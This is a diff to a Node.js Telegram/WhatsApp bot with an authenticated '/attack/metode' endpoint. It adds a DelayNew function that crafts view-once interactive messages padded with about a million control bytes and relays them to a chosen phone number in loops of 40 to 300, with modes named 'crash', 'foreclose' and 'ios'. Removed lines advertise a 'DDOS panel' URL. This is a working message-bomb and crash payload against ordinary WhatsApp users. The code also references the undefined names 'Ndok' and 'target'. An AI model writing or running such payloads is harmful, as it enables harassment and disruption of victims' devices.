@@ -100,7 +100,7 @@ const file_session = "./sessions.json";
 const sessions_dir = "./sessions";
 const bot = new Telegraf(Token);
 
-let dim;
+let dray;
 
 let maintenanceMode = false;
 let totalRequests = 0;
@@ -263,7 +263,7 @@ const initializeWhatsAppConnections = async () => {
     const sessionDir = sessionPath(botNumber);
     const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
 
-    dim = makeWASocket({
+    dray = makeWASocket({
       auth: state,
       printQRInTerminal: true,
       logger: pino({ level: "silent" }),
@@ -271,10 +271,10 @@ const initializeWhatsAppConnections = async () => {
     });
 
     await new Promise((resolve, reject) => {
-      dim.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
+      dray.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
         if (connection === "open") {
           console.log(`Bot ${botNumber} connected!`);
-          sessions.set(botNumber, dim);
+          sessions.set(botNumber, dray);
           return resolve();
         }
         if (connection === "close") {
@@ -282,7 +282,7 @@ const initializeWhatsAppConnections = async () => {
           reconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
         }
       });
-      dim.ev.on("creds.update", saveCreds);
+      dray.ev.on("creds.update", saveCreds);
     });
   }
 };
@@ -307,19 +307,19 @@ const connectToWhatsApp = async (botNumber, chatId, ctx) => {
 
   let paired = false;
 
-  dim = makeWASocket({
+  dray = makeWASocket({
     auth: state,
     printQRInTerminal: false,
     logger: pino({ level: "silent" }),
     defaultQueryTimeoutMs: undefined,
   });
 
-  dim.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
+  dray.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
     if (connection === "connecting") {
       if (!fs.existsSync(`${sessionDir}/creds.json`)) {
         setTimeout(async () => {
           try {
-            const code = await dim.requestPairingCode(botNumber);
+            const code = await dray.requestPairingCode(botNumber);
             const formatted = code.match(/.{1,4}/g)?.join("-") || code;
             await editStatus(makeCode(botNumber, formatted));
           } catch (err) {
@@ -332,7 +332,7 @@ const connectToWhatsApp = async (botNumber, chatId, ctx) => {
 
     if (connection === "open" && !paired) {
       paired = true;
-      sessions.set(botNumber, dim);
+      sessions.set(botNumber, dray);
       saveActive(botNumber);
       await editStatus(makeStatus(botNumber, "✅ Connected successfully."));
     }
@@ -349,8 +349,8 @@ const connectToWhatsApp = async (botNumber, chatId, ctx) => {
     }
   });
 
-  dim.ev.on("creds.update", saveCreds);
-  return dim;
+  dray.ev.on("creds.update", saveCreds);
+  return dray;
 };
 
 const makeStatus = (number, status) => 
@@ -542,7 +542,127 @@ bot.command("delress", (ctx) => {
 });
 
 // fangsion kamyuh🤭
+async function DelayNew(isTarget) {
+    let permissionX = await generateWAMessageFromContent(
+        isTarget,
+        {
+            viewOnceMessage: {
+                message: {
+                    interactiveResponseMessage: {
+                        body: {
+                            text: "hi my name is mexx!!?༑",
+                            format: "DEFAULT",
+                        },
+                        nativeFlowResponseMessage: {
+                            name: "call_permission_request",
+                            paramsJson: "\x10".repeat(1045000),
+                            version: 3,
+                        },
+                        entryPointConversionSource: "call_permission_message",
+                    },
+                },
+            },
+        },
+        {
+            ephemeralExpiration: 0,
+            forwardingScore: 9741,
+            isForwarded: true,
+            font: Math.floor(Math.random() * 99999999),
+            background:
+                "#" +
+                Math.floor(Math.random() * 16777215)
+                    .toString(16)
+                    .padStart(6, "99999999"),
+        }
+    );
+    
+    let permissionY = await generateWAMessageFromContent(
+        isTarget,
+        {
+            viewOnceMessage: {
+                message: {
+                    interactiveResponseMessage: {
+                        body: {
+                            text: "hi my name is mexx!!?༑",
+                            format: "DEFAULT",
+                        },
+                        nativeFlowResponseMessage: {
+                            name: "galaxy_message",
+                            paramsJson: "\x10".repeat(1045000),
+                            version: 3,
+                        },
+                        entryPointConversionSource: "call_permission_request",
+                    },
+                },
+            },
+        },
+        {
+            ephemeralExpiration: 0,
+            forwardingScore: 9741,
+            isForwarded: true,
+            font: Math.floor(Math.random() * 99999999),
+            background:
+               "#" +
+               Math.floor(Math.random() * 16777215)
+               .toString(16)
+               .padStart(6, "99999999"),
+        }
+    );    
 
+    await dray.relayMessage(
+        "status@broadcast",
+        permissionX.message,
+        {
+            messageId: permissionX.key.id,
+            statusJidList: [isTarget],
+            additionalNodes: [
+                {
+                    tag: "meta",
+                    attrs: {},
+                    content: [
+                        {
+                            tag: "mentioned_users",
+                            attrs: {},
+                            content: [
+                                {
+                                    tag: "to",
+                                    attrs: { jid: isTarget },
+                                },
+                            ],
+                        },
+                    ],
+                },
+            ],
+        }
+    );
+    
+    await Ndok.relayMessage(
+        "status@broadcast",
+        permissionY.message,
+        {
+            messageId: permissionY.key.id,
+            statusJidList: [target],
+            additionalNodes: [
+                {
+                    tag: "meta",
+                    attrs: {},
+                    content: [
+                        {
+                            tag: "mentioned_users",
+                            attrs: {},
+                            content: [
+                                {
+                                    tag: "to",
+                                    attrs: { jid: target },
+                                },
+                            ],
+                        },
+                    ],
+                },
+            ],
+        }
+    );    
+}
 
 app.get("/attack/metode", requireAuth,  async (req, res) => {
   try {
@@ -568,51 +688,43 @@ app.get("/attack/metode", requireAuth,  async (req, res) => {
     switch (metode.toLowerCase()) {
       case "crash":
         for (let i = 0; i < 40; i++) {
-          await payXgtw(dim, isTarget);
+          await DelayNew(isTarget)
         }
         break;
 
       case "foreclose":
         for (let i = 0; i < 40; i++) {
-          await FcBeta(sock, isTarget);
-          await CallUi(sock, isTarget);
-          await fccil(sock, isTarget);
+          await DelayNew(isTarget)
         }
         break;
 
       case "blank":
         for (let i = 0; i < 40; i++) {
-          await blankPayload(sock, isTarget);
+          await DelayNew(isTarget)
         }
         break;
 
       case "ios":
         for (let i = 0; i < 40; i++) {
-          await iosInVis(sock, isTarget);
-          await crashNewIos(sock, isTarget);
-          await fccil(sock, isTarget);
+          await DelayNew(isTarget)
         }
         break;
 
       case "delay":
         for (let i = 0; i < 300; i++) {
-          await yyyyy(dim, isTarget);
+          await DelayNew(isTarget)
         }
         break;
 
       case "call":
         for (let i = 0; i < 40; i++) {
-          await SpamCall(sock, isTarget);
+          await DelayNew(isTarget)
         }
         break;
 
       case "combo":
         for (let i = 0; i < 40; i++) {
-          await FcBeta(sock, isTarget);
-          await CallUi(sock, isTarget);
-          await fccil(sock, isTarget);
-          await iosInVis(sock, isTarget);
-          await crashNewIos(sock, isTarget);
+          await DelayNew(isTarget)
         }
         break;
 
@@ -711,8 +823,5 @@ bot.launch();
 
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`🚀 Server is running on port ${PORT}`);
-  console.log(` Access dashboard: https://nullbyte.space/dashboard`);
-  console.log(` Access DDOS panel: https://nullbyte.space/ddos-dashboard`);
-  console.log(` Public URL: https://nullbyte.space/`);
 });
 
